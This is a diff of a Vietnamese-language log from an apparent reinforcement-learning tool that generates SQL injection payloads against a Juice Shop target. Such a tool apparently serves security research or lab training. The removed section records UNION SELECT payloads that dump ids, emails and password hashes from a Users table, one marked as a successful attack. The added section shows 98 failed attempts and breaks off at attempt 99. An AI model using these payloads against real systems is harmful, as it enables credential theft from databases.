@@ -1,48 +1,408 @@
-2025-11-08 15:24:50,356 - --- Bắt đầu tự động dự đoán (tối đa 200 lần) ---
-2025-11-08 15:24:51,039 - [QTable] Đã tải model từ: results/target_results/juiceshop_model_v1.json
-2025-11-08 15:24:51,039 - 
---- Lần thử 1/200 ---
-2025-11-08 15:24:51,041 -   (Payload quá dài 194 chars, dừng sớm tại step 27)
-2025-11-08 15:24:51,042 - Đã tạo Payload: "--FROMadmin'admin'))FROM''))FROM''UsersadminNULLbemailORNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,--aadmin(*aNULLa')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--" (dài 194 chars)
-2025-11-08 15:24:51,043 -   Đang gửi payload để kiểm tra...
-2025-11-08 15:24:51,146 -   Kết quả: Thất bại (Reward=-3). Đang thử lại...
-2025-11-08 15:24:51,147 - 
---- Lần thử 2/200 ---
-2025-11-08 15:24:51,150 -   (Payload quá dài 144 chars, dừng sớm tại step 26)
-2025-11-08 15:24:51,151 - Đã tạo Payload: "*a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--'email'bUNION'Userspassword='','''))'1=0FROM(FROMUsers=''*'FROM)'" (dài 144 chars)
-2025-11-08 15:24:51,153 -   Đang gửi payload để kiểm tra...
-2025-11-08 15:24:51,252 -   Kết quả: Thất bại (Reward=-5). Đang thử lại...
-2025-11-08 15:24:51,253 - 
---- Lần thử 3/200 ---
-2025-11-08 15:24:51,254 -   (Payload quá dài 168 chars, dừng sớm tại step 26)
-2025-11-08 15:24:51,255 - Đã tạo Payload: "ORFROMNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULLUsers'''--ANDNULLemail,emailUsers*NULL'SELECT'))'id,email,password,NULL,NULL,NULL,NULL,NULL,NULL*1=1--SELECT--password" (dài 168 chars)
-2025-11-08 15:24:51,256 -   Đang gửi payload để kiểm tra...
-2025-11-08 15:24:51,329 -   Kết quả: Thất bại (Reward=-3). Đang thử lại...
-2025-11-08 15:24:51,330 - 
---- Lần thử 4/200 ---
-2025-11-08 15:24:51,332 -   (Payload quá dài 184 chars, dừng sớm tại step 26)
-2025-11-08 15:24:51,332 - Đã tạo Payload: "NULL,NULL(a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--'1=1 )OR( ''SELECTORAND(1=0UNION*b password'AND)id,email,password,NULL,NULL,NULL,NULL,NULL,NULLb" (dài 184 chars)
-2025-11-08 15:24:51,334 -   Đang gửi payload để kiểm tra...
-2025-11-08 15:24:51,402 -   Kết quả: Thất bại (Reward=-5). Đang thử lại...
-2025-11-08 15:24:51,403 - 
---- Lần thử 5/200 ---
-2025-11-08 15:24:51,405 -   (Payload quá dài 233 chars, dừng sớm tại step 26)
-2025-11-08 15:24:51,406 - Đã tạo Payload: "Users--,id,email,password,NULL,NULL,NULL,NULL,NULL,NULLSELECTNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL'NULLNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL''ba, '1=1(FROMNULL'1=1--SELECTNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULLAND'" (dài 233 chars)
-2025-11-08 15:24:51,415 -   Đang gửi payload để kiểm tra...
-2025-11-08 15:24:51,490 -   Kết quả: Thất bại (Reward=-3). Đang thử lại...
-2025-11-08 15:24:51,491 - 
---- Lần thử 6/200 ---
-2025-11-08 15:24:51,493 -   (Payload quá dài 161 chars, dừng sớm tại step 26)
-2025-11-08 15:24:51,494 - Đã tạo Payload: "aORpassword1=1Users'password')(ANDUsersemailUNIONa')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users----*a*SELECT,=''--NULL,NULL'--admin" (dài 161 chars)
-2025-11-08 15:24:51,496 -   Đang gửi payload để kiểm tra...
-2025-11-08 15:24:51,561 -   Kết quả: Thất bại (Reward=-3). Đang thử lại...
-2025-11-08 15:24:51,562 - 
---- Lần thử 7/200 ---
-2025-11-08 15:24:51,563 -   (Payload quá dài 513 chars, dừng sớm tại step 26)
-2025-11-08 15:24:51,564 - Đã tạo Payload: "a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--ANDbadmina')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--aUsers'a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--UsersNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL'ORNULL,NULL--1=0id,email,password,NULL,NULL,NULL,NULL,NULL,NULLANDid,email,password,NULL,NULL,NULL,NULL,NULL,NULL--a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--ORemailemailFROM--OR" (dài 513 chars)
-2025-11-08 15:24:51,572 -   Đang gửi payload để kiểm tra...
-2025-11-08 15:24:51,654 - 
-========================================
-2025-11-08 15:24:51,655 - !!! TẤN CÔNG THÀNH CÔNG (Reward=200) !!!
-2025-11-08 15:24:51,656 - Payload chiến thắng: a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--ANDbadmina')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--aUsers'a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--UsersNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL'ORNULL,NULL--1=0id,email,password,NULL,NULL,NULL,NULL,NULL,NULLANDid,email,password,NULL,NULL,NULL,NULL,NULL,NULL--a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--ORemailemailFROM--OR
-2025-11-08 15:24:51,659 - ========================================
+2025-11-24 10:33:21,513 - --- Bắt đầu tự động dự đoán (tối đa 100 lần) ---
+2025-11-24 10:33:21,513 - Sử dụng Config: config/config_target.ini
+2025-11-24 10:33:21,514 - Sử dụng Model: results/target_results/target_model.json
+2025-11-24 10:33:21,515 - Độ ngẫu nhiên (Epsilon): 0.05
+2025-11-24 10:33:21,776 - [QTable] Đã tải model từ: results/target_results/target_model.json
+2025-11-24 10:33:21,777 - 
+--- Lần thử 1/100 ---
+2025-11-24 10:33:22,031 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:22,032 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:22,033 - 
+--- Lần thử 2/100 ---
+2025-11-24 10:33:22,242 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:22,243 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:22,244 - 
+--- Lần thử 3/100 ---
+2025-11-24 10:33:22,534 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:22,537 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:22,540 - 
+--- Lần thử 4/100 ---
+2025-11-24 10:33:22,825 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:22,826 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:22,827 - 
+--- Lần thử 5/100 ---
+2025-11-24 10:33:23,088 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:23,090 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:23,091 - 
+--- Lần thử 6/100 ---
+2025-11-24 10:33:23,368 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:23,373 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:23,374 - 
+--- Lần thử 7/100 ---
+2025-11-24 10:33:23,704 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:23,706 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:23,708 - 
+--- Lần thử 8/100 ---
+2025-11-24 10:33:23,891 -   Payload cuối: ", NULL, NULL, NULL WHEREq'))"
+2025-11-24 10:33:23,892 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:23,893 - 
+--- Lần thử 9/100 ---
+2025-11-24 10:33:24,089 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:24,091 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:24,092 - 
+--- Lần thử 10/100 ---
+2025-11-24 10:33:24,261 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:24,262 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:24,263 - 
+--- Lần thử 11/100 ---
+2025-11-24 10:33:24,436 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:24,437 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:24,438 - 
+--- Lần thử 12/100 ---
+2025-11-24 10:33:24,624 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:24,624 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:24,625 - 
+--- Lần thử 13/100 ---
+2025-11-24 10:33:24,847 -   Payload cuối: ", NULL, NULL, NULL, password, NULL, NULLq'))"
+2025-11-24 10:33:24,848 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:24,849 - 
+--- Lần thử 14/100 ---
+2025-11-24 10:33:25,017 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:25,019 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:25,020 - 
+--- Lần thử 15/100 ---
+2025-11-24 10:33:25,244 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:25,245 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:25,246 - 
+--- Lần thử 16/100 ---
+2025-11-24 10:33:25,498 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:25,499 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:25,500 - 
+--- Lần thử 17/100 ---
+2025-11-24 10:33:25,739 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:25,741 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:25,742 - 
+--- Lần thử 18/100 ---
+2025-11-24 10:33:25,911 -   Payload cuối: ", NULL, NULL Users, NULLq'))"
+2025-11-24 10:33:25,913 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:25,914 - 
+--- Lần thử 19/100 ---
+2025-11-24 10:33:26,076 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:26,077 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:26,078 - 
+--- Lần thử 20/100 ---
+2025-11-24 10:33:26,282 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:26,282 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:26,283 - 
+--- Lần thử 21/100 ---
+2025-11-24 10:33:26,458 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:26,459 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:26,460 - 
+--- Lần thử 22/100 ---
+2025-11-24 10:33:26,762 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:26,764 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:26,765 - 
+--- Lần thử 23/100 ---
+2025-11-24 10:33:26,814 -   Payload cuối: "'))"
+2025-11-24 10:33:26,815 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:26,815 - 
+--- Lần thử 24/100 ---
+2025-11-24 10:33:27,002 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:27,004 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:27,005 - 
+--- Lần thử 25/100 ---
+2025-11-24 10:33:27,170 -   Payload cuối: ", NULL, NULL, id WHEREq'))"
+2025-11-24 10:33:27,171 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:27,172 - 
+--- Lần thử 26/100 ---
+2025-11-24 10:33:27,343 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:27,344 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:27,348 - 
+--- Lần thử 27/100 ---
+2025-11-24 10:33:27,514 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:27,515 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:27,516 - 
+--- Lần thử 28/100 ---
+2025-11-24 10:33:27,681 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:27,682 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:27,683 - 
+--- Lần thử 29/100 ---
+2025-11-24 10:33:27,865 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:27,872 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:27,873 - 
+--- Lần thử 30/100 ---
+2025-11-24 10:33:28,131 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:28,133 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:28,133 - 
+--- Lần thử 31/100 ---
+2025-11-24 10:33:28,379 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:28,380 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:28,381 - 
+--- Lần thử 32/100 ---
+2025-11-24 10:33:28,605 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:28,606 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:28,607 - 
+--- Lần thử 33/100 ---
+2025-11-24 10:33:28,900 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:28,902 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:28,904 - 
+--- Lần thử 34/100 ---
+2025-11-24 10:33:29,183 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:29,185 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:29,186 - 
+--- Lần thử 35/100 ---
+2025-11-24 10:33:29,436 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:29,437 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:29,438 - 
+--- Lần thử 36/100 ---
+2025-11-24 10:33:29,726 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:29,728 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:29,729 - 
+--- Lần thử 37/100 ---
+2025-11-24 10:33:29,900 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:29,902 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:29,903 - 
+--- Lần thử 38/100 ---
+2025-11-24 10:33:30,183 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:30,183 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:30,184 - 
+--- Lần thử 39/100 ---
+2025-11-24 10:33:30,379 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:30,380 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:30,381 - 
+--- Lần thử 40/100 ---
+2025-11-24 10:33:30,654 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:30,656 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:30,656 - 
+--- Lần thử 41/100 ---
+2025-11-24 10:33:30,877 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:30,878 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:30,879 - 
+--- Lần thử 42/100 ---
+2025-11-24 10:33:31,063 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:31,063 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:31,064 - 
+--- Lần thử 43/100 ---
+2025-11-24 10:33:31,332 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:31,333 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:31,334 - 
+--- Lần thử 44/100 ---
+2025-11-24 10:33:31,543 -   Payload cuối: ", NULL, NULL SELECT, passwordq'))"
+2025-11-24 10:33:31,544 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:31,546 - 
+--- Lần thử 45/100 ---
+2025-11-24 10:33:31,762 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:31,762 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:31,764 - 
+--- Lần thử 46/100 ---
+2025-11-24 10:33:32,011 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:32,013 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:32,013 - 
+--- Lần thử 47/100 ---
+2025-11-24 10:33:32,186 -   Payload cuối: ", NULL, NULL--, NULL, NULLq'))"
+2025-11-24 10:33:32,187 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:32,188 - 
+--- Lần thử 48/100 ---
+2025-11-24 10:33:32,395 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:32,398 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:32,399 - 
+--- Lần thử 49/100 ---
+2025-11-24 10:33:32,634 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:32,635 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:32,636 - 
+--- Lần thử 50/100 ---
+2025-11-24 10:33:32,869 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:32,871 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:32,872 - 
+--- Lần thử 51/100 ---
+2025-11-24 10:33:33,167 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:33,168 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:33,168 - 
+--- Lần thử 52/100 ---
+2025-11-24 10:33:33,505 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:33,507 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:33,507 - 
+--- Lần thử 53/100 ---
+2025-11-24 10:33:33,778 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:33,781 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:33,782 - 
+--- Lần thử 54/100 ---
+2025-11-24 10:33:33,949 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:33,950 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:33,951 - 
+--- Lần thử 55/100 ---
+2025-11-24 10:33:34,121 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:34,122 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:34,123 - 
+--- Lần thử 56/100 ---
+2025-11-24 10:33:34,294 -   Payload cuối: ", NULL, password, NULL, NULLq'))"
+2025-11-24 10:33:34,295 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:34,296 - 
+--- Lần thử 57/100 ---
+2025-11-24 10:33:34,464 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:34,465 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:34,466 - 
+--- Lần thử 58/100 ---
+2025-11-24 10:33:34,654 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:34,656 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:34,658 - 
+--- Lần thử 59/100 ---
+2025-11-24 10:33:34,824 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:34,825 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:34,827 - 
+--- Lần thử 60/100 ---
+2025-11-24 10:33:34,992 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:34,996 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:34,998 - 
+--- Lần thử 61/100 ---
+2025-11-24 10:33:35,206 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:35,207 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:35,209 - 
+--- Lần thử 62/100 ---
+2025-11-24 10:33:35,469 -   Payload cuối: ", NULL, NULL, NULL, password, emailq'))"
+2025-11-24 10:33:35,470 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:35,471 - 
+--- Lần thử 63/100 ---
+2025-11-24 10:33:35,663 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:35,663 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:35,665 - 
+--- Lần thử 64/100 ---
+2025-11-24 10:33:35,828 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:35,830 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:35,831 - 
+--- Lần thử 65/100 ---
+2025-11-24 10:33:36,003 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:36,004 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:36,006 - 
+--- Lần thử 66/100 ---
+2025-11-24 10:33:36,241 -   Payload cuối: "--, id, NULL, NULL, NULL, NULLq'))"
+2025-11-24 10:33:36,242 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:36,242 - 
+--- Lần thử 67/100 ---
+2025-11-24 10:33:36,377 -   Payload cuối: ", NULL, NULL, NULL'))"
+2025-11-24 10:33:36,379 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:36,380 - 
+--- Lần thử 68/100 ---
+2025-11-24 10:33:36,555 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:36,557 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:36,558 - 
+--- Lần thử 69/100 ---
+2025-11-24 10:33:36,722 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:36,723 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:36,724 - 
+--- Lần thử 70/100 ---
+2025-11-24 10:33:37,019 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:37,021 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:37,022 - 
+--- Lần thử 71/100 ---
+2025-11-24 10:33:37,190 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:37,191 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:37,192 - 
+--- Lần thử 72/100 ---
+2025-11-24 10:33:37,357 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:37,359 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:37,360 - 
+--- Lần thử 73/100 ---
+2025-11-24 10:33:37,532 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:37,533 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:37,534 - 
+--- Lần thử 74/100 ---
+2025-11-24 10:33:37,705 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:37,706 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:37,707 - 
+--- Lần thử 75/100 ---
+2025-11-24 10:33:38,025 -   Payload cuối: ", NULL, NULL, NULL, password FROMq'))"
+2025-11-24 10:33:38,026 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:38,027 - 
+--- Lần thử 76/100 ---
+2025-11-24 10:33:38,231 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:38,233 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:38,234 - 
+--- Lần thử 77/100 ---
+2025-11-24 10:33:38,416 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:38,417 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:38,418 - 
+--- Lần thử 78/100 ---
+2025-11-24 10:33:38,587 -   Payload cuối: ", NULL, NULL FROM Usersq'))"
+2025-11-24 10:33:38,589 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:38,590 - 
+--- Lần thử 79/100 ---
+2025-11-24 10:33:38,756 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:38,757 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:38,758 - 
+--- Lần thử 80/100 ---
+2025-11-24 10:33:38,931 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:38,932 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:38,933 - 
+--- Lần thử 81/100 ---
+2025-11-24 10:33:39,113 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:39,115 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:39,116 - 
+--- Lần thử 82/100 ---
+2025-11-24 10:33:39,322 -   Payload cuối: ", id--, NULL Users'))"
+2025-11-24 10:33:39,324 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:39,325 - 
+--- Lần thử 83/100 ---
+2025-11-24 10:33:39,485 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:39,486 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:39,487 - 
+--- Lần thử 84/100 ---
+2025-11-24 10:33:39,584 -   Payload cuối: ", NULL, NULL'))"
+2025-11-24 10:33:39,585 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:39,586 - 
+--- Lần thử 85/100 ---
+2025-11-24 10:33:39,755 -   Payload cuối: ", NULL, NULL, passwordq'))"
+2025-11-24 10:33:39,757 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:39,757 - 
+--- Lần thử 86/100 ---
+2025-11-24 10:33:39,964 -   Payload cuối: ", NULL, NULL, NULL, password, NULL, NULLq'))"
+2025-11-24 10:33:39,965 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:39,966 - 
+--- Lần thử 87/100 ---
+2025-11-24 10:33:40,130 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:40,131 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:40,132 - 
+--- Lần thử 88/100 ---
+2025-11-24 10:33:40,312 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:40,313 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:40,314 - 
+--- Lần thử 89/100 ---
+2025-11-24 10:33:40,404 -   Payload cuối: ", NULL, NULL'))"
+2025-11-24 10:33:40,405 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:40,406 - 
+--- Lần thử 90/100 ---
+2025-11-24 10:33:40,577 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:40,578 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:40,579 - 
+--- Lần thử 91/100 ---
+2025-11-24 10:33:40,744 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:40,745 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:40,746 - 
+--- Lần thử 92/100 ---
+2025-11-24 10:33:40,954 -   Payload cuối: ", NULL, NULL, NULL, password, NULLq'))"
+2025-11-24 10:33:40,956 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:40,957 - 
+--- Lần thử 93/100 ---
+2025-11-24 10:33:41,089 -   Payload cuối: ", NULL, NULL, NULL'))"
+2025-11-24 10:33:41,090 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:41,091 - 
+--- Lần thử 94/100 ---
+2025-11-24 10:33:41,227 -   Payload cuối: ", NULL, NULL, NULL, NULLq'))"
+2025-11-24 10:33:41,228 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:41,229 - 
+--- Lần thử 95/100 ---
+2025-11-24 10:33:41,409 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:41,411 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:41,412 - 
+--- Lần thử 96/100 ---
+2025-11-24 10:33:41,589 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:41,590 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:41,590 - 
+--- Lần thử 97/100 ---
+2025-11-24 10:33:41,759 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:41,760 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:41,761 - 
+--- Lần thử 98/100 ---
+2025-11-24 10:33:41,921 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:41,922 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:41,923 - 
+--- Lần thử 99/100 ---
